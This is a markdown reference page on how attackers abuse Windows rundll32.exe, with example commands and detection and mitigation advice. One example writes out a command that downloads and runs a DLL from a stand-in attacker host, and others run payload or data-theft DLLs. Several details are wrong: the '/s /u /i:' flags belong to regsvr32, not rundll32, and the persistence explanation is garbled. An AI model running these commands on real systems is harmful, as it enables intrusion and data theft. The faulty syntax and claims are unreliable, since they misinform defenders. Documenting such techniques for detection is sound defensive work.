# rundll32.exe
## What is it?
*```rundll32.exe``` is a Windows utility that allows for the execution of functions stored in dynamic link library (DLL) files. It is typically used by administrators and developers to run specific functions within DLL files without needing to write an application for that function.*

*Because it is a trusted system utility, it is often abused by attackers to run malicious code stored in a DLL, bypassing security measures and evading detection.*

## Legitimate Usage
- **Execute Functions in DLL Files** → ```rundll32.exe``` is used to execute specific functions within DLL files without the need for a separate executable.
- **System Configuration & Maintenance** → Administrators may use it for configuring system settings or running maintenance tasks that are encapsulated in DLL files.
- **Loading Control Panel Applets** → It is used for launching certain control panel applets or settings from within the operating system.
- **Running Scripts & Applications via DLL** → System administrators and developers may use it to automate various system tasks.

## How to abuse it
- **Executing Malicious Code** → Attackers can use ```rundll32.exe``` to load and execute a malicious DLL or payload.
- **Bypassing Application Whitelisting** → Since ```rundll32.exe``` is a trusted, signed Windows binary, attackers can use it to execute malicious code and bypass application control policies.
- **Persistence via DLL Execution** → Attackers can use ```rundll32.exe``` to maintain access by executing malicious DLLs that allow them to persist on the system.
- **Exfiltration of Data** → ```rundll32.exe``` can be used to exfiltrate data by executing a DLL that uploads sensitive files to remote servers.

## Example attacks
### 1. Running Malicious DLL
*Attackers can use ```rundll32.exe``` to execute malicious code stored within a DLL.*

**Run Malicious DLL with rundll32**

```
rundll32.exe malicious.dll,EntryPoint
```

**Effect:**
- **```malicious.dll```** → The malicious DLL file that contains the attacker's payload.
- **```EntryPoint```** → The function in the DLL to execute. This function could be any arbitrary code, such as a backdoor or data exfiltration routine.

### 2. Persistence via DLL Execution
*Attackers can register a malicious DLL to run every time ```rundll32.exe``` is invoked.*

**Set up Malicious DLL for Persistence**

```
rundll32.exe /s /u /i:malicious.dll
```

**Effect:**
- The malicious DLL will be executed every time the system calls ```rundll32.exe``` with the appropriate parameters, providing persistent access.

### 3. Exfiltration via Malicious DLL
*Attackers can use ```rundll32.exe``` to execute a DLL that steals data and sends it to a remote server.*

**Exfiltrate Data via rundll32**

```
rundll32.exe exfiltration.dll,UploadData
```

**Effect:**
- **```exfiltration.dll```** → A DLL that includes a function to steal sensitive data.
- **```UploadData```** → The function in the DLL that uploads stolen data to an attacker-controlled server.

### 4. Bypassing Application Whitelisting
*Since ```rundll32.exe``` is a trusted binary, attackers can use it to bypass application whitelisting or other security controls.*

**Bypass Whitelisting Using rundll32**

```
rundll32.exe /s /u /i:http://malicious.com/malicious.dll
```

**Effect:**
- The attacker downloads and executes a malicious DLL via ```rundll32.exe```, bypassing whitelisting measures that would otherwise block direct execution of the payload.

### 5. DLL Hijacking with rundll32
*An attacker can place a malicious DLL with the same name as a legitimate system DLL, causing ```rundll32.exe``` to load and execute the malicious DLL instead.*

**Exploit DLL Hijacking with rundll32**

```
rundll32.exe legitimate.dll,Function
```

**Effect:**
- If the attacker places the malicious DLL with the same name as a legitimate system DLL in a trusted directory, the ```rundll32.exe``` command will load the malicious DLL, executing arbitrary code in place of the legitimate function.

# Detection & Mitigation
## Detection Methods
**Monitor rundll32.exe Executions**
- **Event ID 4688 (Process Creation)** → Look for unusual use of ```rundll32.exe```, particularly when invoked with suspicious arguments such as external URLs or untrusted DLLs.
- **Network Traffic Analysis** → Detect abnormal outbound traffic, especially when a DLL is downloading a payload from an external server.
- **File Integrity Checks** → Track changes to DLLs or suspicious DLL registrations that may signal malicious activity.

**Suspicious DLL Execution**
- **Event ID 4697 (Service Installation)** → Detect when a DLL is registered or executed using ```rundll32.exe``` for persistence or data exfiltration.
- **Look for DLLs with unusual names** or those found in unusual directories, which may indicate malicious activity.

## Mitigation Strategies
- **Use Application Control** → Implement Application Whitelisting (AppLocker or WDAC) to prevent unauthorized execution of ```rundll32.exe``` or unknown DLL files.
- **Monitor Windows Event Logs** → Regularly review Event Viewer logs for suspicious ```rundll32.exe``` activity, particularly when invoked with suspicious DLLs.
- **Restrict User Privileges** → Limit administrative privileges and prevent unauthorized users from executing ```rundll32.exe``` or registering DLL files.
- **Block Untrusted Network Traffic** → Prevent downloading of DLLs from untrusted sources by blocking outbound traffic to unknown IPs or URLs.
- **Limit DLL Registration** → Restrict DLL registration to trusted applications and users only, and prevent unauthorized DLLs from being executed.
